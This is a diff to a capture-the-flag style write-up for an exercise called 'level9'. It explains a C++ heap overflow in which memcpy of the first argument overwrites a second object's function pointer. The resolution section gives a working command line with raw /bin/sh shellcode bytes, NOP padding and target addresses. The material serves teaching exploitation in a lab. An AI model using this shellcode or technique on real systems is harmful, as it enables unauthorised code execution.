@@ -6,11 +6,12 @@
 
  * We run the program with gdb and we observe that:
  	* In the `main()`
-		* `_Znwj@plt()` is called to allocate `0x6c` of memory
-		* `_ZN1NC1Ei()` is called to fill the previously allocated memory, with a function pointer pointer, and a value at the end.
+		* Object creation:
+			1. `_Znwj@plt()` is called to allocate a new instance of class, for a total size of  `0x6c`, which is on the heap
+			2. `_ZN1NC1Ei()` is called to construct our new instance of class, with a function pointer pointer, an unitialized buffer `buf[0x64]` and a value at the end.
 		* We repeat a second time these 2 operations.
 		* `_ZN1N13setAnnotationEPc()` is then called on object_1
-			* a `memcpy()` is done on `av[1]`
+			* a `memcpy()` is done on `av[1]` to the internal buffer `buf[0x64]` of the instance.
 		* Finally, the function pointer pointer of the 2nd object is called.
 
 ## Exploited vulnerability
@@ -19,12 +20,16 @@
 
 * The shellcode we used is a call to `system("/bin/sh")`
 
-* Here is a visual representation memory layout : ![Layout](Layout_Objects.png)
+* Here is a visual representation memory layout : ![Layout](Ressources/Layout_Objects.png)
+
+* So using the blue offsets on this visual representation :
+
+During the `memcpy()` we change the second object function pointer pointer at `0x70`, so it points to the begining of the first object buffer at `0x4`, which himself points at `0x8`, where starts our shellcode.
 
 ## Resolution
 
 ```sh
-./level9 `python -c "print('10a00408'.decode('hex') + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + '\x90' * 79 +  '0ca00408'.decode('hex'))"
+./level9 `python -c "print('10a00408'.decode('hex') + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + '\x90' * 79 +  '0ca00408'.decode('hex'))"`
 
 $ cd ..
 $ cd bonus0
